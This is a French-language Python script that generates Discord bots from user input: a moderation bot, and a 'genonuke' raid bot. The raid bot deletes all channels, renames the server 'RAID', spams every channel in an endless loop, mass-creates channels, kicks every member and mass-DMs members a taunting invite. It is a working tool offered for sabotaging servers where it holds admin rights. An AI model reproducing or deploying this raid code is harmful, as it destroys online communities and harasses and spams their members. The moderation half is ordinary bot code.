from asyncore import loop
from os import name, system
import time
from time import sleep


try :
    from pystyle import *
    from discord import *
    from discord.ext import commands
    from escape import Escape


except ModuleNotFoundError :
    print("Module introuvable")
    time.sleep(1.5)
    print("installation des modules ......")
    time.sleep(1)

try :
    system("pip install discord")
    system("pip install discord.py==2.1.0")
    system("pip install escape")
    system ("pip install requests")
    system("cls")
    time.sleep(1)
    print("module installer sans soucis .")
    time.sleep(1)
    system("cls")

except :
    print("les module ne peuvent etre installer .")
    time.sleep(2)
    print("verifier que 'pip' est bien installer et ajouter a votre 'patch' !")
    input()
    quit()



if name == "nt":
        system("title GENO")
        def clear():
            system("cls")
else:
    def clear():
        system("clear")


def main():
    clear()
    print("\n \n \n \n")
    print(Escape("                                      ") + Escape("[").red() + Escape("+").blue() + Escape("]").red() + Escape("===============================").red() + Escape("[").red() + Escape("+").blue() + Escape("]").red())
    print(Escape("                                       ") + Escape("┃").red()+ Escape("     1 => Simple bot maker       ").white()+ Escape("┃").red())
    print(Escape("                                       ") + Escape("┃").red()+ Escape("     2 => Simple bot raid maker  ").white()+ Escape("┃").red())
    print(Escape("                                       ") + Escape("┃").red()+ Escape("     3 => information            ").white()+ Escape("┃").red())
    print(Escape("                                      ") + Escape("[").red() + Escape("+").blue() + Escape("]").red() + Escape("===============================").red() + Escape("[").red() + Escape("+").blue() + Escape("]").red())
    print("")
    print(Escape("ᴬᴸᴸ ᴰᴱⱽ ᴵˢ ᴹᴬᴰᴱ ᴮʸ ᶜʰᵒᶜᵒ⁸ᵉˣᵉ ᴼᴺ ᴰᴵˢᶜᴼᴿᴰ").yellow())
    print("")
    mode = input("entrez votre choix -> ")

    def inf():
        clear()
        print(Escape("genobot is a simple bot that includes ").blue() + Escape (" ticket system ").red() + Escape("(dm bot to open the ticket),").blue() + Escape(" voice join to create system ").red() + Escape(" \n role given according").red() + Escape (" to a precise text in the bio").blue())
        print("")
        print(Escape("commands :").blue() + Escape("\n clear \n ban \n unban \n mute \n unmute \n say \n tts (convert text to mp3) \n servinfo").red())
        print("")
        print("")
        print(Escape ("genonuke is a simple raid bot that includes : \n ").blue() + Escape("dl ( delet all channel ) \n edit ( deface )\n sall ( spam all channel )\n cspam ( spam channel ) \n mpall ( mp all members in serveur ! ").red())
        print("")
        b = input("press enter for back ")

        if b =="":
            main()



    def gb():
        clear()
        titre = """
         ██████  ███████ ███    ██  ██████  ██████   ██████  ████████ 
        ██       ██      ████   ██ ██    ██ ██   ██ ██    ██    ██    
        ██   ███ █████   ██ ██  ██ ██    ██ ██████  ██    ██    ██    
        ██    ██ ██      ██  ██ ██ ██    ██ ██   ██ ██    ██    ██    
         ██████  ███████ ██   ████  ██████  ██████   ██████     ██   
        """
        print(Colorate.Diagonal(Colors.red_to_yellow, Center.XCenter(titre)))
        print("")
        print("Bonjour et bienvenue cher Genocorp \nici vous pourraiez crèe vos bot discord avec une simplicite que nul autre ne pouras vous fournir . ")
        print("")
        time.sleep(1.5)
        btoken = Write.Input("entree le token de votre bot -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        print("bien nous allons de suite commencer la creation")
        print("")
        time.sleep(1.5)
        prefix = Write.Input("entree le prefix de votre bot -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        print("Nous allons maintenant poursuivre avec le systéme de ticket :")
        time.sleep(1.5)
        print("")
        guild_id = Write.Input("entree l'id de votre server -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        print("Nous allons maintenant poursuivre avec le systéme de verifiaction :")
        time.sleep(1.5)
        print("")
        rolereac = Write.Input("entree l'id du role a donner une fois la verifiaction faite   -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        imgverif = Write.Input("entee le lien de l'image de l'embed verification -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        verifmsg = Write.Input("entrée le message de l'embed verification  -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        print("Nous allons maintenant poursuivre avec le systéme de join to create  :")
        time.sleep(1.5)
        print("")
        vcid = Write.Input("entree l'id du channel Join to Create  -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        print("Nous allons maintenant poursuivre avec le systéme message arrivant : ")
        time.sleep(1.5)
        print("")
        idjoinm = Write.Input("entee l'ID du channel arrivant -> ", Colors.red_to_yellow, interval=0.005)
        print("")
        time.sleep(1.5)
        imgjoin = Write.Input("entee le lien de l'image de l'embed message arrivant  -> ", Colors.red_to_yellow, interval=0.005)
        print("")
        time.sleep(1.5)
        joinmsg = Write.Input("entree le message de l'embed message arrivant (ajouter {member.mention} pour ping l'arrivant) -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        print("Nous allons maintenant poursuivre avec le custom du bot ( embed ) : ")
        print("")
        time.sleep(1.5)
        imgembedall = Write.Input("entee le lien de l'image que le bot auras sur chaque embed (help, ect) -> ", Colors.red_to_yellow, interval=0.005)
        print("Nous pouvons enfin finir la creation du bot grace a cette info je vous remercie . \nveuillez attendre quelques seconde notre ingenieur Genocorp s'occupe de tous ! ")
        time.sleep(2)


        
        bot = r"""
import discord, discord.ui
from discord.ext import commands
from gtts import gTTS
import io
from typing import Dict

TOKEN = '"""+ btoken +r"""'
PREFIX = '"""+ prefix +r"""'
reaction_title = ""
reactions = {}
reaction_message_id = ""
bot = commands.Bot(command_prefix = PREFIX ,intents=discord.Intents.all(), description = "dev par Choco8exe#8725" )
bot.remove_command("help")


@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name='"""+ prefix +r"""help for more info', url="http://www.twitch.tv/choco8exe"))
    print("Ready !")
    bot.add_view(Roles())


####
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("erreur cette commande et introuvable regarder bien l'orthographe .")
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("il manque un argument.")
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("vous n'avez pas les permissions pour faire cette commande.")
    elif isinstance(error.original, discord.Forbidden):
        await ctx.send("Oups, je n'ai pas les permissions necessaires pour faire cette commande.")

####
@bot.event
async def on_message(message: discord.Message):
    GUILD_ID = """+guild_id+r"""  
    ctx: commands.Context = await bot.get_context(message)

   
    if not hasattr(bot, "opened_channels"):
        bot.opened_channels: Dict[int, int] = {}

    opened_channels: Dict[int, int] = bot.opened_channels

    if message.guild is None :
        
        my_guild = bot.get_guild(GUILD_ID)
        overwrites = {
            my_guild.default_role: discord.PermissionOverwrite(read_messages=False),
            my_guild.me: discord.PermissionOverwrite(read_messages=True),
            message.author: discord.PermissionOverwrite(read_messages=True),
        }
        channel: discord.TextChannel = await my_guild.create_text_channel(
            message.author.name, reason=f"Ticket Created by {message.author}", overwrites=overwrites
        )

        embed: discord.Embed = discord.Embed(
            title="**Ticket**",
            description=message.content,
            color=0x000000,
            timestamp=message.created_at
        )
        embed.set_author(name=str(message.author),)
        await channel.send(embed=embed,)
        await channel.send(f"@everyone **{message.author}** open the ticket")
        await channel.send(f"Type `/Close` to close the ticket")

        bot.opened_channels[message.author.id] = channel.id

    
    if message.content.lower() == f"/Close".lower() and message.channel.id in bot.opened_channels.values():
        for author_id, channel_id in bot.opened_channels.copy().items():
            if message.channel.id == channel_id:
                del bot.opened_channels[author_id]
        await message.channel.delete(reason="Closing ticket")

    await bot.process_commands(message)




@bot.event
async def on_voice_state_update(member, before, after):
    s = bot.get_guild(""" + guild_id + r""")
    try:
        if after.channel.id == """+ vcid +r""":
            global channel 
            channel = await s.create_voice_channel(str(member))
            await member.move_to(channel)
    except:
        try: await channel.delete()
        except: pass


#### TEST
@bot.command()
async def test(ctx):
    await ctx.message.delete()   
    await ctx.send("test ok")

#### CLEAR
@bot.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx, nombre : int):
    message =await ctx.channel.history(limit = nombre + 1).flatten()
    for message in message:
        await message.delete()

#### BAN
@bot.command()
async def ban(ctx, user : discord.User, *reason):
    reason = " ".join(reason)
    await ctx.guild.ban(user, reason = reason)
    await ctx.send(f"`{user}` à été ban pour la raison  : **{reason}**.")

### UNBAN   
@bot.command()
async def unban(ctx, user, *reason):
    reason = " ".join(reason)
    userName, userId = user.split("#")
    bannedUsers = await ctx.guild.bans()
    for i in bannedUsers:
        if i.user.name == userName and i.user.discriminator == userId:
            await ctx.guild.unban(i.user, reason = reason)
            await ctx.send(f"{user} à été unban.")
            return
    await ctx.send(f"L'utilisateur `{user}` n'est pas dans la liste des bans")


#######CREATE MUTE ROLE 

async def createMutedRole(ctx):
    mutedRole = await ctx.guild.create_role(name = "Muted",
                                            permissions = discord.Permissions(
                                                send_messages = False,
                                                speak = False),
                                            reason = "Creation du role Muted pour mute des gens.")
    for channel in ctx.guild.channels:
        await channel.set_permissions(mutedRole, send_messages = False, speak = False)
    return mutedRole
async def getMutedRole(ctx):
    roles = ctx.guild.roles
    for role in roles:
        if role.name == "Muted":
            return role
    return await createMutedRole(ctx)

####### 




#### MUTE 
@bot.command()
@commands.has_permissions(manage_roles=True)    
async def mute(ctx, member : discord.Member, *, reason = "Aucune raison n'a ete renseigne"):
    mutedRole = await getMutedRole(ctx)
    await member.add_roles(mutedRole, reason = reason)
    await ctx.send(f"{member.mention} a ete mute !")

#### UNMUTE 
@bot.command()
@commands.has_permissions(manage_roles=True)
async def unmute(ctx, member : discord.Member, *, reason = "Aucune raison n'a ete renseigne"):
    mutedRole = await getMutedRole(ctx)
    await member.remove_roles(mutedRole, reason = reason)
    await ctx.send(f"{member.mention} a ete unmute !")

#### SAY
@bot.command()
async def say(ctx, *texte):
    await ctx.send(" ".join(texte))

#### HELP
@bot.command()
async def help(ctx):
        embed = discord.Embed(
        colour=discord.Colour.blue(),
        title="HELP",
        description=" by Choco8exe#8725"
    )
        embed.set_author(name=f"prefix [{ PREFIX }]", icon_url='"""+imgembedall+r"""')
        embed.set_thumbnail(url='"""+imgembedall+r"""')
        embed.add_field(name="ban", value="``-> ban une personne.``", inline=True)
        embed.add_field(name="unban", value="``-> unban une personne.``", inline=True)
        embed.add_field(name="mute", value="``-> mute une personne.``", inline=True)
        embed.add_field(name="unmute", value="``-> unmute une personne.``", inline=True)
        embed.add_field(name="Clear", value="``-> clear le chat.``", inline=True)
        embed.add_field(name="servinfo", value="``-> donne les info du serv.``", inline=True)
        embed.add_field(name="tts", value="``-> convertie votre text en message audio .``", inline=True)
        embed.add_field(name="say", value="``-> Faire dire au bot se que vous voulez.``", inline=True)
        embed.add_field(name="createur", value="``-> donne les credit du bot .``", inline=True)
        embed.add_field(name="addrole", value="``-> ajoute un role  .``", inline=True)
        embed.add_field(name="react", value="``-> role perso  .``", inline=True)
        embed.add_field(name="colors", value="``-> liste des couleur  .``", inline=True)
        embed.set_footer(text="``by Choco8exe#8725``")
        await ctx.send(embed=embed)


#### tts
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang="fr")
    tts.write_to_fp(f)
    f.seek(0)
    return f 

@bot.command()
async def tts(ctx, *, message): 
    await ctx.message.delete()
    prout =  do_tts(message)
    await ctx.send(file=discord.File(prout, f"{message}.mp3"))


##### serv info
@bot.command()
async def servinfo(ctx):
        server = ctx.guild
        numberOfTextChannels = len(server.text_channels)
        numberOfVoiceChannels = len(server.voice_channels)
        serverDescription = server.description
        numberOfPerson = server.member_count
        serverName = server.name
        embed = discord.Embed(
        colour=discord.Colour.red(),
        title="information",
        description="by Choco8exe#8725"
    )
        embed.set_author(name=f"prefix ({PREFIX})", icon_url='"""+imgembedall+r"""')
        embed.add_field(name="``Membre :``", value=f" -> {numberOfPerson}", inline=False)
        embed.add_field(name="``Nom su server :``", value=f" -> {serverName}", inline=False)
        embed.add_field(name="``salons ecrit :``", value=f" -> {numberOfTextChannels}", inline=False)
        embed.add_field(name="``salon vocaux :``", value=f" -> {numberOfVoiceChannels}", inline=False)
        embed.set_footer(text="by Choco8exe#8725")
        await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(manage_roles=True)
async def addrole(ctx, role: discord.Role, *members: discord.Member):
    for m in members:
        await m.add_roles(role)
        await ctx.message.delete()
        await ctx.send(f"Role {role} ajouter a {m.mention} !")

class Roles(discord.ui.View):
  def __init__(self):
    super().__init__(timeout = None)
  @discord.ui.button(label = "Verification", custom_id = "Verification", style = discord.ButtonStyle.secondary)
  async def button1(self, interaction, button):
    role = """ + rolereac + r"""
    user = interaction.user
    if role in [y.id for y in user.roles]:
      await user.remove_roles(user.guild.get_role(role))
      await interaction.response.send_message("You have removed a role!", ephemeral = True)
    else:
      await user.add_roles(user.guild.get_role(role))
      await interaction.response.send_message("You have added a role!", ephemeral = True)

@bot.command()
@commands.has_permissions(ban_members=True) 
async def verif(ctx):
  embed = discord.Embed(
        colour=discord.Colour.blue(),
        title="Verification",
  ) 
  embed.set_thumbnail(url='""" + imgverif + r"""')
  embed.add_field (name='**Verification** 👋' ,value='"""+verifmsg+r"""')
  embed.set_footer(text="by Choco8exe#8725")
  await ctx.message.delete()
  await ctx.send(embed = embed, view = Roles())

@bot.event
async def on_member_join(member):
    channel = bot.get_channel("""+idjoinm+r""") 

    embed = discord.Embed(
        colour=discord.Colour.blue(),
  ) 
    embed.set_thumbnail(url='""" + imgjoin + r"""')
    embed.add_field (name='**welcome** 👋' ,value=f' """+joinmsg+r"""')
    embed.set_footer(text="by Choco8exe#8725")
    await channel.send(embed = embed)




@bot.command(aliases=['react'])
async def reaction_create_post(ctx):
    embed = discord.Embed(title="Create Reaction Post", color=discord.Colour.dark_purple())
    embed.add_field(name="Set Title", value=f"`{PREFIX}set_title [New Title]`", inline=False)
    embed.add_field(name="Add Role", value=f"`{PREFIX}add_role ROLE EMOJI`", inline=False)
    embed.add_field(name="Remove Role", value=f"`{PREFIX}remove_role @Role`", inline=False)
    embed.add_field(name="Reaction reply Post", value=f"`{PREFIX}send_react`", inline=False)
    await ctx.reply(embed=embed)
    await ctx.message.delete()


@bot.command(aliases=['set_title'])
@commands.has_permissions(manage_roles=True)
async def reaction_set_title(ctx, *, new_title):
    global reaction_title
    reaction_title = new_title
    await ctx.reply(f"Voici le titre désormais : `{new_title}`", delete_after=30)
    await ctx.message.delete()



@bot.command(aliases=['colors', 'couleur', 'color', 'colour'])
async def reaction_colors(ctx):
    await ctx.message.delete()
    page1 = discord.Embed(title="**Listes des couleurs page :**", description="Voici les commandes disponibles:", color=0x8c00ff)
    page1.set_thumbnail(url="https://i.imgur.com/weetlGr.png")
    page1.add_field(name="Rouge ->", value="`red`", inline=False)
    page1.add_field(name="Rouge foncé ->", value="`dark_red`", inline=False)
    page1.add_field(name="Cyan ->", value="`teal`", inline=False)
    page1.add_field(name="Cyan foncé ->", value="`dark_teal `", inline=False)
    page1.add_field(name="Vert ->", value="`green`", inline=False)
    page1.add_field(name="Vert foncé ->", value="`dark_green`", inline=False)
    page1.add_field(name="Bleu ->", value="`blue`", inline=False)
    page1.add_field(name="Bleu foncé ->", value="`dark_blue`", inline=False)
    page1.add_field(name="Violet ->", value="`purple`", inline=False)
    page1.add_field(name="Violet foncé ->", value="`dark_purple`", inline=False)
    page1.add_field(name="Rose ->", value="`magenta`", inline=False)
    page1.add_field(name="**Page :**", value="**1/2**", inline=False)

    page2 = discord.Embed ( title="**Listes des couleurs :**", description="Voici les commandes disponibles:", color=0x8c00ff)
    page2.set_thumbnail(url="https://i.imgur.com/weetlGr.png")
    page2.add_field(name="Rose foncé ->", value="`dark_magenta`", inline=False)
    page2.add_field(name="Jaune ->", value="`gold`", inline=False)
    page2.add_field(name="Jaune foncé ->", value="`dark_gold`", inline=False)
    page2.add_field(name="Orange ->", value="`orange`", inline=False)
    page2.add_field(name="Orange foncé ->", value="`dark_orange`", inline=False)
    page2.add_field(name="Gris clair ++ ->", value="`lighter_grey`", inline=False)
    page2.add_field(name="Gris foncé ->", value="`dark_grey`", inline=False)
    page2.add_field(name="Gris clair ->", value="`light_grey`", inline=False)
    page2.add_field(name="Noir ->", value="`darker_grey`", inline=False)
    page2.add_field(name="Bleu-Violet ->", value="`blurple`", inline=False)
    page2.add_field(name="Gris-Violet ->", value="`greyple`", inline=False)
    page2.add_field(name="**Page :**", value="**2/2**", inline=False)
    pages = [page1, page2]
    message = await ctx.send(embed = page1)
    await message.add_reaction('⏮')
    await message.add_reaction('◀')
    await message.add_reaction('▶')
    await message.add_reaction('⏭')
    def check(reaction, user):
        return user == ctx.author
    i = 0
    reaction = None
    while True:
        if str(reaction) == '⏮':
            i = 0
            await message.edit(embed = pages[i])
        elif str(reaction) == '◀':
            if i > 0:
                i -= 1
                await message.edit(embed = pages[i])
        elif str(reaction) == '▶':
            if i < 4:
                i += 1
                await message.edit(embed = pages[i])
        elif str(reaction) == '⏭':
            i = 4
            await message.edit(embed = pages[i])
        try:
            reaction, user = await bot.wait_for('reaction_add', timeout = 30.0, check = check)
            await message.remove_reaction(reaction, user)
        except:
            break
    await message.clear_reactions()
    await message.delete()






@bot.command(aliases=['add_role'])
async def reaction_add_role(ctx, role, reaction, color: discord.Colour):
    global reactions
    reactions[role] = reaction
    guild = ctx.guild
    if role is None:
        return await ctx.reply(f"Veuillez saisir un nom de role ! *(Exemple : {PREFIX}add_role test🙂 🙂 red)*")
    role = await guild.create_role(name=role, colour=color)
    await ctx.reply(f"Le rôle `{role}` a bien été créer !", delete_after=30)
    await ctx.message.delete()


@bot.command(aliases=['remove_role'])
@commands.has_permissions(manage_roles=True)
async def reaction_remove_role(ctx, role: discord.Role):
    if role.name in reactions:
        del reactions[role.name]
        await ctx.reply(f"Le rôle `{role.name}` viens d'être retirer", delete_after=30)
        await ctx.message.delete()
    else:
        await ctx.reply("Le rôle spécifier n'est pas a la liste :/", delete_after=30)
    print(reactions)


@bot.command(aliases=['send_react'])
async def reaction_send_post(ctx):
    description = "React to add roles"
    for role in reactions:
        description += f"`{role}` - {reactions[role]} \n"
    embed = discord.Embed(title=reaction_title, color=discord.Colour.red())
    embed.add_field(name = "role", value = description)
    message = await ctx.reply(embed=embed)
    global reaction_message_id
    reaction_message_id = str(message.id)
    for role in reactions:
        await message.add_reaction(reactions[role])
    await ctx.message.delete()



@bot.event
async def on_reaction_add(reaction, user):
    if not user.bot:
        message = reaction.message
        if str(message.id) == reaction_message_id:
            role_to_give = ""
            for role in reactions:
                if reactions[role] == reaction.emoji:
                    role_to_give = role
            role_for_reaction = discord.utils.get(user.guild.roles, name=role_to_give)
            await user.add_roles(role_for_reaction)


@bot.event
async def on_reaction_remove(reaction, user):
    if not user.bot:
        message = reaction.message
        if str(message.id) == reaction_message_id:
            role_to_remove = ""
            for role in reactions:
                if reactions[role] == reaction.emoji:
                    role_to_remove = role
            role_for_reaction = discord.utils.get(user.guild.roles, name=role_to_remove)
            await user.remove_roles(role_for_reaction)



bot.run(TOKEN)
    
    """
    
        with open("bot.py", "w", encoding="utf-8") as f:
            f.write(bot)
        f.close()
        print("bot cree")
        time.sleep(5)
        quit()







    def gn():
        titre = """
     ██████  ███████ ███    ██  ██████  ███    ██ ██    ██ ██   ██ ███████ 
    ██       ██      ████   ██ ██    ██ ████   ██ ██    ██ ██  ██  ██      
    ██   ███ █████   ██ ██  ██ ██    ██ ██ ██  ██ ██    ██ █████   █████   
    ██    ██ ██      ██  ██ ██ ██    ██ ██  ██ ██ ██    ██ ██  ██  ██      
     ██████  ███████ ██   ████  ██████  ██   ████  ██████  ██   ██ ███████ 
                                                                          
    """

        System.Clear()
        print(Colorate.Diagonal(Colors.red_to_yellow, Center.XCenter(titre)))
        print("")
        print("Bonjour et bienvenue cher Genocorp \nici vous pourraiez crèe vos bot discord avec une simplicite que nul autre ne pouras vous fournir . ")
        print("")
        time.sleep(1.5)
        btoken = Write.Input("entree le token de votre bot -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        print("bien nous allons de suite commencer la creation")
        print("")
        time.sleep(1.5)
        prefix = Write.Input("entree le prefix de votre bot -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        numberc = Write.Input("entree le nombre de channels a cree : -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        nc = Write.Input("entree le nom des channels ?  -> ", Colors.red_to_yellow, interval=0.005)
        print("")
        time.sleep(1.5)
        msg = Write.Input("entree le message a spamm ?  -> ", Colors.red_to_yellow, interval=0.005)
        print("")
        time.sleep(1.5)
        print("Nous pouvons enfin finir la creation du bot grace a cette info je vous remercie . \nveuillez attendre quelques seconde notre ingenieur Genocorp s'occupe de tous ! ")
        time.sleep(2)
    
        bot = """
from escape import Escape
from asyncio.tasks import sleep
import discord
from discord import message
from discord import client
from discord import colour
from discord import embeds
from discord.ext import commands, tasks
from discord.ext.commands.core import check
from discord.ext import commands
import random
import asyncio
import json
import time
from datetime import datetime, timedelta, timezone
from typing import Optional

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix = '""" + prefix + """' ,intents=discord.Intents.all(), description = "dev par Choco8exe#8725" )

@bot.event
async def on_ready():
    print("Bot is ready")
    print(Escape ("commands : \n ").blue() + Escape("dl ( delet all channel ) \n edit ( deface )\n sall ( spam all channel )\n cspam ( spam channel ) \n mpall ( mp all members in serveur ! ").red())

@bot.command()
async def dl(ctx,channel_id="all"):
  await ctx.message.delete()
  if channel_id == "all":
    for channel in ctx.guild.channels:
        await channel.delete()
    await ctx.guild.create_text_channel(name='""" + nc + """')



@bot.command()
async def edit(ctx):
    await ctx.guild.edit(name="RAID")

@bot.command()
async def sall(ctx):
    while True:
        for channel in ctx.guild.channels:
            await channel.send('""" + msg + """')


@bot.command()
async def ka(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.kick()
            print(f"Kicked {user}")
        except:
           pass

@bot.command()
async def cspam(ctx,amount=""" + numberc + """,name_of_channel='""" + nc + """'):
  await ctx.message.delete() 
  for times in range(amount):
    await ctx.guild.create_text_channel(name_of_channel)
    print(f"spam {amount} Channels {name_of_channel}")

@bot.command(pass_context=True)
async def mpall(ctx):
    await ctx.message.delete()
    for member in list(bot.get_all_members()):
        await asyncio.sleep(0)
        try:
            embed = discord.Embed(title="il ne faut pas donner le role admin a des personnes aleatoires!", url="https://discord.gg/KppqFeX9am", description="ups is the end for this server ..." , color=discord.Colour.purple())
            embed.add_field(
                name="Discord Server",
                value=
                "[ [ Click here ] ](https://discord.gg/KppqFeX9am)",
                inline=False)
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1037452451369976021/1037452759831691294/4708_Pikachu_Hello.gif")
            embed.set_footer(text="hoo shitt ...")
            await member.send(embed=embed)
        except:
            pass
        print("Action completed: Message all")


bot.run('""" + btoken + """')
    """
    
        with open("botnuke.py", "w", encoding="utf8") as f:
            f.write(bot)
        f.close()
        print("bot cree !")
        time.sleep(3)
        quit()

    if mode == "":
        main()
    if mode == "1":
        gb()
    if mode == "2":
        gn()
    if mode == "3":
        inf()

if __name__ == '__main__':
    while True:
        main()
